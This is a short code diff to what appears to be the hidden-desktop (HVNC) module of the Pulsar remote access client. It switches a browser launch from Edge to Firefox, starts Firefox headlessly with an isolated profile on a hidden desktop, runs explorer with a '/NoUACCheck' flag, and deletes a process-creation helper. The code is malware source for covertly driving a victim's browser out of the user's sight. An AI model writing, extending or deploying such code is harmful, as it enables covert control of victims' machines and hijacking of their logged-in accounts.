@@ -124,7 +124,7 @@ namespace Pulsar.Client.Helper.HVNC
             else
             {
                 DeleteFolder(text);
-                this.StartEdge();
+                this.StartFirefox();
             }
             string filePath2 = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
             this.CreateProc(filePath2);
@@ -316,15 +316,6 @@ namespace Pulsar.Client.Helper.HVNC
             }
             string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
             this.CreateProc(explorerPath);
-        }
-
-        public bool CloseProc(string filePath)
-        {
-            STARTUPINFO structure = default(STARTUPINFO);
-            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
-            structure.lpDesktop = this.DesktopName;
-            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
-            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
         }
 
         public bool CreateProc(string filePath)
